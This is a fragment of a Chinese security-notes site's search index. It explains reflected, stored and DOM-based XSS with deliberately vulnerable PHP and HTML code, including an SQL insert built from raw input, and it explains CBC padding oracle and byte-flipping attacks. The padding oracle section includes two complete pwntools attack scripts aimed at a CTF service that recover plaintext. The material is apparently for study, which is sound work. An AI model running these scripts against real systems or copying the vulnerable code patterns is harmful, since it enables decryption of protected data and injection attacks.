<p>DOM\u578bXSS\u5176\u5b9e\u662f\u4e00\u79cd\u7279\u6b8a\u7c7b\u578b\u7684\u53cd\u5c04\u578bXSS\uff0c\u5b83\u662f\u57fa\u4e8eDOM\u6587\u6863\u5bf9\u8c61\u6a21\u578b\u7684\u4e00\u79cd\u6f0f\u6d1e\u3002\u5728\u7f51\u7ad9\u9875\u9762\u4e2d\u6709\u8bb8\u591a\u9875\u9762\u7684\u5143\u7d20\uff0c\u5f53\u9875\u9762\u5230\u8fbe\u6d4f\u89c8\u5668\u65f6\u6d4f\u89c8\u5668\u4f1a\u4e3a\u9875\u9762\u521b\u5efa\u4e00\u4e2a\u9876\u7ea7\u7684Document object\u6587\u6863\u5bf9\u8c61\uff0c\u63a5\u7740\u751f\u6210\u5404\u4e2a\u5b50\u6587\u6863\u5bf9\u8c61\uff0c\u6bcf\u4e2a\u9875\u9762\u5143\u7d20\u5bf9\u5e94\u4e00\u4e2a\u6587\u6863\u5bf9\u8c61\uff0c\u6bcf\u4e2a\u6587\u6863\u5bf9\u8c61\u5305\u542b\u5c5e\u6027\u3001\u65b9\u6cd5\u548c\u4e8b\u4ef6\u3002\u53ef\u4ee5\u901a\u8fc7JS\u811a\u672c\u5bf9\u6587\u6863\u5bf9\u8c61\u8fdb\u884c\u7f16\u8f91\u4ece\u800c\u4fee\u6539\u9875\u9762\u7684\u5143\u7d20\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5ba2\u6237\u7aef\u7684\u811a\u672c\u7a0b\u5e8f\u53ef\u4ee5\u901a\u8fc7DOM\u6765\u52a8\u6001\u4fee\u6539\u9875\u9762\u5185\u5bb9\uff0c\u4ece\u5ba2\u6237\u7aef\u83b7\u53d6DOM\u4e2d\u7684\u6570\u636e\u5e76\u5728\u672c\u5730\u6267\u884c\u3002\u57fa\u4e8e\u8fd9\u4e2a\u7279\u6027\uff0c\u5c31\u53ef\u4ee5\u5229\u7528JS\u811a\u672c\u6765\u5b9e\u73b0XSS\u6f0f\u6d1e\u7684\u5229\u7528\u3002</p> <p>\u5173\u4e8eDOM\u578bXSS</p> <p>\u5b66\u53f7\uff1a16030140019 \u59d3\u540d: \u83ab\u76ca\u5f70 \u3010\u5d4c\u725b\u5bfc\u8bfb\u3011\uff1aDOM\uff0c\u5168\u79f0Document Object Model\uff0c\u662f\u4e00\u4e2a\u5e73\u53f0\u548c\u8bed\u8a00\u90fd\u4e2d\u7acb\u7684\u63a5\u53e3\uff0c\u53ef\u4ee5\u4f7f\u7a0b\u5e8f\u548c\u811a\u672c\u80fd\u591f\u52a8\u6001\u8bbf\u95ee...</p> <p>image.vnd.microsoft.icon</p> <p>[https://www.jianshu.com/p/190dedd585f2](</p>"},{"location":"web/XSS_CSS_CSP/xss/XSS/#_5","title":"\u5229\u7528\u4e3e\u4f8b","text":""},{"location":"web/XSS_CSS_CSP/xss/XSS/#_6","title":"\u53cd\u5c04","text":"<p>\u7ed9\u51fa\u6e90\u7801</p> <pre><code>//\u524d\u7aef 1.html\uff1a\n&lt;html&gt;\n&lt;head lang=\"en\"&gt;\n    &lt;meta charset=\"UTF-8\"&gt;\n    &lt;title&gt;\u53cd\u5c04\u578bXSS&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n    &lt;form action=\"action.php\" method=\"post\"&gt;\n        &lt;input type=\"text\" name=\"name\" /&gt;\n        &lt;input type=\"submit\" value=\"\u63d0\u4ea4\"&gt;\n    &lt;/form&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n//\u540e\u7aef action.php\uff1a\n&lt;?php\n    $name=$_POST[\"name\"]; \n    echo $name;\n?&gt;\nPlain Text\n</code></pre> <p>\u8fd9\u91cc\u6709\u4e00\u4e2a\u7528\u6237\u63d0\u4ea4\u7684\u9875\u9762\uff0c\u7528\u6237\u53ef\u4ee5\u5728\u6b64\u63d0\u4ea4\u6570\u636e\uff0c\u6570\u636e\u63d0\u4ea4\u4e4b\u540e\u7ed9\u540e\u53f0\u5904\u7406</p> <p></p> <p>\u6240\u4ee5\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u8f93\u5165\u6846\u4e2d\u63d0\u4ea4\u6570\u636e\uff1a\uff0c\u770b\u770b\u4f1a\u6709\u4ec0\u4e48\u53cd\u5e94</p> <p></p> <p>\u9875\u9762\u76f4\u63a5\u5f39\u51fa\u4e86hack\u7684\u9875\u9762\uff0c\u53ef\u4ee5\u770b\u5230\uff0c\u6211\u4eec\u63d2\u5165\u7684\u8bed\u53e5\u5df2\u7ecf\u88ab\u9875\u9762\u7ed9\u6267\u884c\u4e86\u3002</p> <p>\u8fd9\u5c31\u662f\u6700\u57fa\u672c\u7684\u53cd\u5c04\u578b\u7684XSS\u6f0f\u6d1e\uff0c\u8fd9\u79cd\u6f0f\u6d1e\u6570\u636e\u6d41\u5411\u662f\uff1a\u524d\u7aef\u2192\u540e\u7aef\u2192\u524d\u7aef</p>"},{"location":"web/XSS_CSS_CSP/xss/XSS/#_7","title":"\u5b58\u50a8","text":"<pre><code>//\u524d\u7aef\uff1a2.html\n&lt;html&gt;\n&lt;head lang=\"en\"&gt;\n&lt;meta charset=\"UTF-8\"&gt;\n&lt;title&gt;\u5b58\u50a8\u578bXSS&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;form action=\"action2.php\" method=\"post\"&gt;\n\u8f93\u5165\u4f60\u7684ID\uff1a  &lt;input type=\"text\" name=\"id\" /&gt; &lt;br/&gt;\n\u8f93\u5165\u4f60\u7684Name\uff1a&lt;input type=\"text\" name=\"name\" /&gt; &lt;br/&gt;\n&lt;input type=\"submit\" value=\"\u63d0\u4ea4\"&gt;\n&lt;/form&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n//\u540e\u7aef\uff1aaction2.php\n&lt;?php\n$id=$_POST[\"id\"];\n$name=$_POST[\"name\"];\nmysql_connect(\"localhost\",\"root\",\"root\");\nmysql_select_db(\"test\");\n\n$sql=\"insert into xss value ($id,'$name')\";\n$result=mysql_query($sql);\n?&gt;\n//\u4f9b\u5176\u4ed6\u7528\u6237\u8bbf\u95ee\u9875\u9762\uff1ashow2.php\n&lt;?php\nmysql_connect(\"localhost\",\"root\",\"root\");\nmysql_select_db(\"test\");\n$sql=\"select * from xss where id=1\";\n$result=mysql_query($sql);\nwhile($row=mysql_fetch_array($result)){\necho $row['name'];\n}\n?&gt;\nPlain Text\n</code></pre> <p>\u8fd9\u91cc\u6709\u4e00\u4e2a\u7528\u6237\u63d0\u4ea4\u7684\u9875\u9762\uff0c\u6570\u636e\u63d0\u4ea4\u7ed9\u540e\u7aef\u4e4b\u540e\uff0c\u540e\u7aef\u5b58\u50a8\u5728\u6570\u636e\u5e93\u4e2d\u3002\u7136\u540e\u5f53\u5176\u4ed6\u7528\u6237\u8bbf\u95ee\u53e6\u4e00\u4e2a\u9875\u9762\u7684\u65f6\u5019\uff0c\u540e\u7aef\u8c03\u51fa\u8be5\u6570\u636e\uff0c\u663e\u793a\u7ed9\u53e6\u4e00\u4e2a\u7528\u6237\uff0cXSS\u4ee3\u7801\u5c31\u88ab\u6267\u884c\u4e86\u3002</p> <p></p> <p>\u6211\u4eec\u8f93\u51651\u548c\uff0c\u6ce8\u610f\uff0c\u8fd9\u91cc\u7684hack\u7684\u5355\u5f15\u53f7\u8981\u8fdb\u884c\u8f6c\u4e49\uff0c\u56e0\u4e3asql\u8bed\u53e5\u4e2d\u7684$name\u662f\u5355\u5f15\u53f7\u7684\uff0c\u6240\u4ee5\u8fd9\u91cc\u4e0d\u8f6c\u4e49\u7684\u8bdd\u5c31\u4f1a\u95ed\u5408sql\u8bed\u53e5\u4e2d\u7684\u5355\u5f15\u53f7\u3002\u4e0d\u7136\u6ce8\u5165\u4e0d\u8fdb\u53bb\u3002\u63d0\u4ea4\u4e86\u4e4b\u540e\uff0c\u6211\u4eec\u770b\u770b\u6570\u636e\u5e93</p> <p></p> <p>\u53ef\u4ee5\u770b\u5230\uff0c\u6211\u4eec\u7684XSS\u8bed\u53e5\u5df2\u7ecf\u63d2\u5165\u5230\u6570\u636e\u5e93\u4e2d\u4e86</p> <p>\u7136\u540e\u5f53\u5176\u4ed6\u7528\u6237\u8bbf\u95ee show2.php \u9875\u9762\u65f6\uff0c\u6211\u4eec\u63d2\u5165\u7684XSS\u4ee3\u7801\u5c31\u6267\u884c\u4e86\u3002</p> <p>\u5b58\u50a8\u578bXSS\u7684\u6570\u636e\u6d41\u5411\u662f\uff1a\u524d\u7aef\u2192\u540e\u7aef\u2192\u6570\u636e\u5e93\u2192\u540e\u7aef\u2192\u524d\u7aef</p> <p></p>"},{"location":"web/XSS_CSS_CSP/xss/XSS/#dom","title":"DOM","text":"<pre><code>// \u524d\u7aef3.html\n&lt;html&gt;\n&lt;head lang=\"en\"&gt;\n&lt;meta charset=\"UTF-8\"&gt;\n&lt;title&gt;DOM\u578bXSS&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;form action=\"action3.php\" method=\"post\"&gt;\n&lt;input type=\"text\" name=\"name\" /&gt;\n&lt;input type=\"submit\" value=\"\u63d0\u4ea4\"&gt;\n&lt;/form&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n// \u540e\u7aefaction3.php\n&lt;?php\n$name=$_POST[\"name\"];\n?&gt;\n&lt;input id=\"text\" type=\"text\" value=\"&lt;?php echo $name; ?&gt;\"/&gt;\n&lt;div id=\"print\"&gt;&lt;/div&gt;\n&lt;script type=\"text/javascript\"&gt;\nvar text=document.getElementById(\"text\");\nvar print=document.getElementById(\"print\");\nprint.innerHTML=text.value;  // \u83b7\u53d6 text\u7684\u503c\uff0c\u5e76\u4e14\u8f93\u51fa\u5728print\u5185\u3002\u8fd9\u91cc\u662f\u5bfc\u81f4xss\u7684\u4e3b\u8981\u539f\u56e0\u3002\n&lt;/script&gt;\nPlain Text\n</code></pre> <p>\u8fd9\u91cc\u6709\u4e00\u4e2a\u7528\u6237\u63d0\u4ea4\u7684\u9875\u9762\uff0c\u7528\u6237\u53ef\u4ee5\u5728\u6b64\u63d0\u4ea4\u6570\u636e\uff0c\u6570\u636e\u63d0\u4ea4\u4e4b\u540e\u7ed9\u540e\u53f0\u5904\u7406</p> <p></p> <p>\u6211\u4eec\u53ef\u4ee5\u8f93\u5165\uff0c\u7136\u540e\u770b\u770b\u9875\u9762\u7684\u53d8\u5316</p> <p></p> <p>\u9875\u9762\u76f4\u63a5\u5f39\u51fa\u4e86 hack \u7684\u9875\u9762\uff0c\u53ef\u4ee5\u770b\u5230\uff0c\u6211\u4eec\u63d2\u5165\u7684\u8bed\u53e5\u5df2\u7ecf\u88ab\u9875\u9762\u7ed9\u6267\u884c\u4e86\u3002</p> <p>\u8fd9\u5c31\u662fDOM\u578bXSS\u6f0f\u6d1e\uff0c\u8fd9\u79cd\u6f0f\u6d1e\u6570\u636e\u6d41\u5411\u662f\uff1a\u524d\u7aef\u2192\u6d4f\u89c8\u5668</p> <p>\u5f00\u62d3\u4e00\u4e0b\u8111\u6d1e\uff1aDOM\u578b\u7c7b\u6bd4\u4e00\u4e2a\u89e3\u6790\u6a21\u677f\uff0c\u4f60\u8f93\u5165\u6570\u636e\u76f4\u63a5\u7ed9\u4f60\u89e3\u6790\u4e86\u3002</p>"},{"location":"web/crypto/CBC_Padding_Oracle%E6%94%BB%E5%87%BB/","title":"CBC Padding Oracle\u653b\u51fb","text":"<p>\u539f\u6587\uff1a</p> <p>https://blog.csdn.net/weixin_44843084/article/details/106736385Padding</p> <p>Oracle Attack\u80cc\u540e\u7684\u5173\u952e\u6027\u6982\u5ff5\u4fbf\u662f\u52a0/\u89e3\u5bc6\u65f6\u7684\u586b\u5145\uff08Padding\uff09\u3002\u660e\u6587\u4fe1\u606f\u53ef\u4ee5\u662f\u4efb\u610f\u957f\u5ea6\uff0c\u4f46\u662f\u5757\u72b6\u52a0\u5bc6\u7b97\u6cd5\u9700\u8981\u6240\u6709\u7684\u4fe1\u606f\u90fd\u7531\u4e00\u5b9a\u6570\u91cf\u7684\u6570\u636e\u5757\u7ec4\u6210\u3002\u4e3a\u4e86\u6ee1\u8db3\u8fd9\u6837\u7684\u9700\u6c42\uff0c\u4fbf\u9700\u8981\u5bf9\u660e\u6587\u8fdb\u884c\u586b\u5145\uff0c\u8fd9\u6837\u4fbf\u53ef\u4ee5\u5c06\u5b83\u5206\u5272\u4e3a\u5b8c\u6574\u7684\u6570\u636e\u5757\u3002</p> <p>\u52a0\u5bc6\u65f6\u53ef\u4ee5\u4f7f\u7528\u591a\u79cd\u586b\u5145\u89c4\u5219\uff0c\u4f46\u6700\u5e38\u89c1\u7684\u586b\u5145\u65b9\u5f0f\u4e4b\u4e00\u662f\u5728PKCS#5\u6807\u51c6\u4e2d\u5b9a\u4e49\u7684\u89c4\u5219\u3002PCKS#5\u7684\u586b\u5145\u65b9\u5f0f\u4e3a\uff1a\u660e\u6587\u7684\u6700\u540e\u4e00\u4e2a\u6570\u636e\u5757\u5305\u542bN\u4e2a\u5b57\u8282\u7684\u586b\u5145\u6570\u636e\uff08N\u53d6\u51b3\u4e8e\u660e\u6587\u6700\u540e\u4e00\u5757\u7684\u6570\u636e\u957f\u5ea6\uff09\u3002\u4e0b\u56fe\u662f\u4e00\u4e9b\u793a\u4f8b\uff0c\u5c55\u793a\u4e86\u4e0d\u540c\u957f\u5ea6\u7684\u5355\u8bcd\uff08FIG\u3001BANANA\u3001AVOCADO\u3001PLANTAIN\u3001PASSIONFRUIT\uff09\u4ee5\u53ca\u5b83\u4eec\u4f7f\u7528PKCS#5\u586b\u5145\u540e\u7684\u7ed3\u679c\uff08\u6bcf\u4e2a\u6570\u636e\u5757\u4e3a8\u5b57\u8282\u957f\uff09\u3002\u5982\u679c\u89e3\u5bc6\u540e\u7684\u6700\u540e\u4e00\u4e2a\u6570\u636e\u5757\u672b\u5c3e\u5e76\u975e\u8fd9\u4e9b\u5408\u6cd5\u7684\u5b57\u8282\u5e8f\u5217\uff0c\u5927\u90e8\u5206\u52a0/\u89e3\u5bc6\u7a0b\u5e8f\u90fd\u4f1a\u629b\u51fa\u4e00\u4e2a\u586b\u5145\u5f02\u5e38\u3002\u8fd9\u4e2a\u5f02\u5e38\u5bf9\u4e8e\u653b\u51fb\u8005\u5c24\u4e3a\u5173\u952e\uff0c\u5b83\u662fPaddingOracle Attack\u7684\u57fa\u7840\u3002</p> <p>\u4e4b\u540e\u5173\u4e8e\u6f0f\u6d1e\u90e8\u5206\u53c2\u8003\u6587\u7ae0\uff1ahttps://www.freebuf.com/articles/web/15504.html</p> <p>https://www.jianshu.com/p/ad8bdd87e131</p>"},{"location":"web/crypto/CBC_Padding_Oracle%E6%94%BB%E5%87%BB/#_1","title":"\u539f\u7406","text":"<p>\u8fd9\u91cc\u7b80\u5355\u7684\u7a0d\u5fae\u9610\u8ff0\uff1a</p> <p>CBC(Cipher Block Chaining CBC)\u6a21\u5f0f</p> <p>\u8fd9\u662f\u4e00\u79cd\u5206\u7ec4\u94fe\u63a5\u6a21\u5f0f\uff0c\u76ee\u7684\u662f\u4e3a\u4e86\u4f7f\u539f\u672c\u72ec\u7acb\u7684\u5206\u7ec4\u5bc6\u7801\u52a0\u5bc6\u8fc7\u7a0b\u5f62\u6210\u8fed\u4ee3\uff0c\u4f7f\u6bcf\u6b21\u52a0\u5bc6\u7684\u7ed3\u679c\u5f71\u54cd\u5230\u4e0b\u4e00\u6b21\u52a0\u5bc6\u3002\u8fd9\u884c\u53ef\u4ee5\u5f3a\u5316\u52a0\u5bc6\u7b97\u6cd5\u7684\"\u654f\u611f\u6027\"\uff0c\u5373\u5b9e\u73b0\u6240\u8c13\u7684\"\u96ea\u5d29\u6548\u5e94\"\uff0c\u5728\u9999\u6d53\u7406\u8bba\u4e2d\u8fd9\u5c31\u662f\"\u6270\u4e71\u539f\u5219\"\u3002</p> <p>\u524d\u51e0\u4e2a\u5206\u7ec4\u7684\u89e3\u5bc6\u7ed3\u679c\u5bf9\u6211\u4eec\u90fd\u6ca1\u6709\u610f\u4e49\uff0c\u6211\u4eec\u91cd\u70b9\u5173\u6ce8\u7684\u662f\u6700\u540e\u4e00\u4e2a\u5206\u7ec4\u7684\u89e3\u5bc6\u7ed3\u679c\u3002\u770b\u8fd9\u5f20\u56fe\u53ef\u80fd\u4f1a\u6e05\u695a\u4e00\u70b9:</p> <p></p> <p>\u5728PaddingOracle Attack\u653b\u51fb\u4e2d\uff0c\u653b\u51fb\u8005\u8f93\u5165\u7684\u53c2\u6570\u662fIV+Cipher\uff0c\u6211\u4eec\u8981\u901a\u8fc7\u5bf9IV\u7684\"\u7a77\u4e3e\"\u6765\u8bf7\u6c42\u670d\u52a1\u5668\u7aef\u5bf9\u6211\u4eec\u6307\u5b9a\u7684Cipher\u8fdb\u884c\u89e3\u5bc6\uff0c\u5e76\u5bf9\u8fd4\u56de\u7684\u7ed3\u679c\u8fdb\u884c\u5224\u65ad\u3002</p> <ol> <li> <p>\u653b\u51fb\u8005\u80fd\u591f\u83b7\u5f97\u5bc6\u6587\uff08Ciphertext\uff09\uff0c\u4ee5\u53ca\u9644\u5e26\u5728\u5bc6\u6587\u524d\u9762\u7684IV\uff08\u521d\u59cb\u5316\u5411\u91cf\uff09</p> </li> <li> <p>\u653b\u51fb\u8005\u80fd\u591f\u89e6\u53d1\u5bc6\u6587\u7684\u89e3\u5bc6\u8fc7\u7a0b\uff0c\u4e14\u80fd\u591f\u77e5\u9053\u5bc6\u6587\u7684\u89e3\u5bc6\u7ed3\u679c</p> </li> </ol> <p>\u4e0eCBC\u7ffb\u8f6c\u653b\u51fb\u4e0d\u540c\u7684\u5730\u65b9\u662f\u6211\u4eec\u8fd9\u91cc\u4e0d\u77e5\u9053\u89e3\u5bc6\u4e4b\u540e\u7684\u660e\u6587\uff0c\u53ea\u77e5\u9053\u5e76\u53ef\u63a7IV\u548c\u5bc6\u6587\uff0c\u5bf9\u4e86 \u8fd8\u6709\u89e3\u5bc6\u662f\u5426\u6210\u529f</p> <p>\u89e3\u5bc6\u662f\u5426\u6210\u529f\u8fd9\u4e2a\u70b9\u6210\u4e3a\u4e86padding oracle\u653b\u51fb\u81f3\u5173\u91cd\u8981\u7684\u4e00\u70b9\uff0c</p> <p>\u56e0\u4e3a\u6211\u4eec\u77e5\u9053padding\u53ea\u80fd\u4e3a\uff1a</p> <p>data0x01 \u6216</p> <p>data0x02 0x02 \u6216</p> <p>data0x03 0x03 0x03 \u6216</p> <p>data0x04 0x04 0x04 0x04 \u6216</p> <p>data0x05 0x05 0x05 0x05 0x05 \u6216</p> <p>......</p> <p>\u90a3\u5982\u679c\u51fa\u73b0\u4ee5\u4e0b\u8fd9\u79cdpadding\u7684\u65f6\u5019\u4f1a\u600e\u4e48\u6837\u5462\uff1f</p> <p>data0x05 0x05</p> <p>\uff08\u6b63\u5e38\u6765\u8bf4\u8fd9\u4e2apadding\u5e94\u4e3adata 0x05 0x05 0x05 0x05 0x05\uff09</p> <p>\u90a3\u89e3\u5bc6\u4e4b\u540e\u7684\u68c0\u9a8c\u5c31\u4f1a\u51fa\u73b0\u9519\u8bef\uff0c\u56e0\u4e3apadding\u7684\u4f4d\u6570\u548cpadding\u5185\u5bb9\u4e0d\u4e00\u81f4</p> <p>\u5982\u679c\u8fd9\u4e2a\u670d\u52a1\u6ca1\u6709catch\u8fd9\u4e2a\u9519\u8bef\u7684\u8bdd\u90a3\u4e48\u7a0b\u5e8f\u5c31\u4f1a\u4e2d\u9014\u62a5\u9519\u9000\u51fa\uff0c\u8868\u73b0\u4e3a\uff0c\u5982http\u670d\u52a1\u7684status code\u4e3a500.</p>"},{"location":"web/crypto/CBC_Padding_Oracle%E6%94%BB%E5%87%BB/#_2","title":"CBC Padding Oracle\u653b\u51fb","text":"<p>\u7406\u89e3\u8fd9\u91cc\u7684\u5173\u952e\u5728\u4e8e\u610f\u8bc6\u5230\u670d\u52a1\u5668\u62e5\u6709\u7684\u662f\u6211\u4eec\u63d0\u4ea4\u8fc7\u7a0b\u4e2d\u7684\u4e2d\u95f4\u503c\uff0c\u5b83\u53ea\u7ed9\u4e0e\u5f62\u5f0f\u4e0a\u7684\u5224\u65ad\u800c\u4e0d\u4f1a\u53bb\u4e0e\u660e\u6587\u4e0e\u8fdb\u884c\u6b63\u786e\u4e0e\u5426\u7684\u5339\u914d\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u7b2c\u4e00\u6b21\uff0c\u6211\u4eec\u63d0\u4ea4\uff08xxxxxxx0x\uff0800--ff\uff09\uff09\u53ea\u6709\u6700\u540e\u4e00\u4f4d\u7684\u6570\u503c\uff0c\u8fd9\u65f6\u5019\uff0c\u7531\u4e8e0x01\u20140x08\u5728\u660e\u6587\u4e2d\u4e0d\u53ef\u80fd\u51fa\u73b0\uff0c\u56e0\u6b64\uff0c\u76f8\u5f53\u4e8e\u5f02\u6216\u540e\u7684\u4f2a\u660e\u6587\u4e3azzzzzzzzzzzzz0x01\u8fd9\u65f6\u5019\u53ef\u4ee5\u5f97\u5230\u6211\u4eec\u5229\u7528\u6700\u540e\u4e00\u7ec4\u5bc6\u6587\u7ecf\u8fc7des\u6216aes\u52a0\u5bc6\u5f97\u5230\u7684\u4e2d\u95f4\u503c\uff0c\u6700\u540e\u5c06\u8be5\u4e2d\u95f4\u503c\u4e0e\u5bc6\u94a5\u76f8\u5e94\u7684\u4f4d\u505a\u5f02\u6216\u5373\u53ef\uff0c\u90a3\u4e48\u4e4b\u540e\u6211\u4eec\u9700\u8981\u5f97\u5230\u7684\u662f\u5012\u6570\u7b2c\u4e8c\u4f4d\uff0c\u6b64\u65f6\u4f2a\u660e\u6587\u5e94\u8be5\u4e3azzzzzzzzz0x02 0x02\uff0c\u7531\u4e8e\u6211\u4eec\u5df2\u7ecf\u77e5\u9053\u4e2d\u95f4\u503c\u7684\u6700\u540e\u4e00\u4f4d\uff0c\u90a3\u4e48\u6211\u4eec\u63d0\u4ea4\u7684IV\u503c\u6700\u540e\u4e00\u4f4d\u5e94\u8be5\u6ee1=0x02^\u4e2d\u95f4\u503c\u6700\u540e\u4e00\u4f4d\uff0c\u4e4b\u540e\u7531\u540c\u6837\u7684\u65b9\u6cd5\u53ef\u4ee5\u63a8\u51fa\u7206\u7834\u5012\u6570\u7b2c\u4e8c\u4f4d\u7684\u503c\uff0c\u6211\u4eec\u6bcf\u6b21\u63a8\u76f8\u5f53\u4e8e\u5f97\u5230\u7684\u662f\u4e2d\u95f4\u503c\uff0c\u4e14\u6bcf\u6b21\u4fdd\u6301\u4e00\u4f4d\u6765\u8fdb\u884c\u771f\u6216\u5047\u7684\u7206\u7834\u3002</p>"},{"location":"web/crypto/CBC_Padding_Oracle%E6%94%BB%E5%87%BB/#_3","title":"\u653b\u51fb\u811a\u672c","text":"<p>\u548csql\u6ce8\u5165\u7684\u811a\u672c\u5f88\u7c7b\u4f3c\uff0c\u90fd\u662f\u731c\u6d4b\uff0c\u7136\u540e\u4ece\u670d\u52a1\u5668\u7ed9\u6211\u4eec\u7684\u4e00\u4e2abool\u5224\u65ad</p> <p>\u770b\u5f97\u61c2sql\u6ce8\u5165\u5c31\u4e00\u5b9a\u80fd\u770b\u7684\u61c2\u7f62\uff08\u65e0\u6148\u60b2\u8bf7\uff09\uff1a</p> <pre><code>from pwn import *\nimport base64 as b64\n\nIV = ['\\x00'] * 16\nsecret = 'nPQctp6AezY8BcGPjlYW8Pv+Fpo15LeatsVbj47jqgE='\nsecret1 = b64.b64decode(secret)[0:16]\nsecret2 = b64.b64decode(secret)[16:]\np = remote('10.188.2.20',10010)\nmiddle = []\npt = ''\n\nfor x in xrange(0,16):\n    for y in xrange(0,256):\n        p.recvuntil(\"Give your option:\\n\")\n        p.sendline('3')\n        p.recvuntil(\"IV:\\n\")\n        p.sendline(b64.b64encode(''.join(IV))) #send your IV\n        p.recvuntil(\"Data:\\n\")\n        p.sendline(b64.b64encode(secret1)) #send your Data\n        # p.sendline(b64.b64encode(secret2)) #send your Data\n        res = p.recvuntil(\"\\n\")\n        # print res\n        if 'bad decrypt' in res:\n            IV[15-x] = chr(y)\n        elif 'Decrpytion Done' in res:\n            print IV\n            IV[15-x] = chr(ord(IV[15-x]) ^ (x + 1)) #to get the correct middle, just like ---&gt; IV[0] ^ 0x01 = middle[0]\n            middle.append(ord(IV[15-x])) #store the correct middle\n            print middle\n            pt += chr(ord(IV[15-x]) ^ ord('A')) #first plaint text\n            # pt += chr(ord(IV[15-x]) ^ ord(secret1[15-x])) #second plaint text\n            for z in xrange(0,x + 1):\n                IV[15-z] = chr(middle[z] ^ (x + 2)) #generate the next new IV\n            break\n        else:\n            print res\n            exit()\n        if y == 255:\n            print '[!] Something wrong'\n            print x + 1\n            exit()\n\nprint '[!] Final IV : '\nprint IV\nprint '[!] Get middle : ', middle\nprint '[!] PlaintText is : ' + pt[::-1]\n\n#######################################################################\n\n2\uff1a\nfrom pwn import *\nimport base64 as b64\n\nsecret = 'nPQctp6AezY8BcGPjlYW8Pv+Fpo15LeatsVbj47jqgE='\nsecret1 = b64.b64decode(secret)[0:16]\nsecret2 = b64.b64decode(secret)[16:]\np = remote('10.188.2.20',10010)\n\nmiddle = []\npadding = ''\n\nfor x in xrange(1,17):\n    for y in xrange(0,256):\n        IV = \"\\x00\" * (16-x) + chr(y) + padding\n\n        p.recvuntil(\"Give your option:\\n\")\n        p.sendline(\"3\")\n\n        p.recvuntil(\"IV:\\n\")\n        p.sendline(b64.b64encode(IV))\n\n        p.recvuntil(\"Data:\\n\")\n        p.sendline(b64.b64encode(secret2))\n\n        res = p.recvuntil(\"\\n\")\n        if 'Decrpytion Done' in res:\n            middle.append(y ^ x) #calculate and store the correct middle\n            print middle\n            padding = ''\n            for z in middle:\n                padding = chr((x+1) ^ z) + padding #generate the next new IV tail\n            break\n\nflag = \"\"\nfor x,y in zip(middle,secret1[::-1]):\n    # flag += chr(x ^ ord('A')) #for secret1\n    flag += chr(x ^ ord(y)) #for secret2\nprint flag[::-1]\n</code></pre>"},{"location":"web/crypto/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/","title":"CBC\u5b57\u8282\u7ffb\u8f6c\u653b\u51fb","text":"<p>\u7ffb\u8f6c\u5b57\u8282\u653b\u51fb\u5e94\u8be5\u4f1a\u78b0\u5230\u86ee\u591a</p> <p>\u662fCBC Padding Oracle\u7684\u57fa\u7840\u90e8\u5206\uff0c\u5efa\u8bae\u5148\u7406\u89e3\u6e05\u695a\u8fd9\u4e2a\u518d\u53bb\u5b66\u4e60padding oracle</p>"},{"location":"web/crypto/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/#feistel","title":"Feistel\u6846\u67b6","text":"<p>\u9996\u5148\u9700\u8981\u4ecb\u7ecd\u7684\u662f\u8fd9\u4e2a\u540d\u4e3a\uff26\uff45\uff49\uff53\uff54\uff45\uff4c\u7684\u6846\u67b6</p> <p></p> <p>\u6211\u4eec\u4e0d\u9700\u8981\u8ba4\u6e05\u695aDES\u4e4b\u4e2d\u7684S\u76d2\u4e2d\uff08\u751f\u6210\u5bc6\u94a5\u65f6\u6240\u4f7f\u7528\uff09\u7684\u52a0\u5bc6\u7b97\u6cd5</p> <p>\u53ea\u9700\u8981\u6e05\u695a\u4e00\u4e0b\u6d41\u7a0b\uff0c\u7406\u89e3\u8fd9\u4e2a\u5f02\u6216\u5373\u53ef</p> <p>\u8fd9\u4e48\u7406\u89e3</p> <p>\u9996\u5148\u7ed9\u51fa\u660e\u6587\u548c\u5bc6\u94a5</p> <p>\u7136\u540e\u52a0\u5bc6</p> <p>\u52a0\u5bc6\u6d41\u7a0b\u662f\u8fd9\u6837\u7684</p> <p>\u660e\u6587\u7684\u53f3\u534a\u90e8\u5206\u4f5c\u4e3a\u4e0b\u4e00\u7ea7\u52a0\u5bc6\u660e\u6587\u7684\u5de6\u534a\u90e8\u5206</p> <p>\u53f3\u534a\u90e8\u5206\u518d\u548c\u5bc6\u94a5F\uff08F\u6307\u67d0\u9879\u64cd\u4f5c\uff0c\u53ef\u4ee5\u7406\u89e3\u6210\u67d0\u4e2a\u51fd\u6570\uff09\u4e4b\u540e\uff0c\u5c06\u7ed3\u679c\u548c\u5de6\u534a\u90e8\u5206\u5f02\u6216\u4f5c\u4e3a\u4e0b\u4e00\u7ea7\u52a0\u5bc6\u660e\u6587\u7684\u53f3\u534a\u90e8\u5206\uff0c\u5faa\u73af16\u6b21\uff08\u4e00\u822c\u662f16\u6b21\uff09\u3002</p>"},{"location":"web/crypto/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/#_1","title":"\u653b\u51fb\u59ff\u52bf","text":"<p>CBC\u6a21\u5f0f\u7684\u5168\u79f0\u662fCipher Block Chaining\u6a21\u5f0f\uff08\u5bc6\u6587\u5206\u7ec4\u94fe\u63a5\u6a21\u5f0f\uff09\uff0c\u4e4b\u6240\u4ee5\u53eb\u8fd9\u4e2a\u540d\u5b57\uff0c\u662f\u56e0\u4e3a\u5bc6\u6587\u5206\u7ec4\u50cf\u94fe\u6761\u4e00\u6837\u76f8\u4e92\u8fde\u63a5\u5728\u4e00\u8d77\u3002</p> 